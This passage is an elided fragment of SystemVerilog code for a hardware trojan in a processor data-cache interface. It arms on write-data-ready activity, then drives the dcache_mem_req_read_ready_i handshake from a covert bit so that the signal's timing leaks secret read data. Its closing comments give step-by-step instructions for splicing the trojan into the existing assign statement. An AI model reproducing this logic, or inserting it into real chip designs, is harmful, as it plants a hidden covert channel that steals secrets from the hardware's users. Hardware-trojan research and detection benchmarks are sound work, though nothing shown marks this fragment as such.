 ...
 * Payload: Modulate dcache_mem_req_read_ready_i timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |dcache_mem_req_write_data_ready_i) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of dcache_mem_req_read_ready_i:
...
logic       covert_bit_out;         // Drives dcache_mem_req_read_ready_i when trojan active
...
//   Find the assign for dcache_mem_req_read_ready_i (or rd_error_o as fallback):
//     assign dcache_mem_req_read_ready_i = <normal_expr>;
//   Replace with:
//     assign dcache_mem_req_read_ready_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
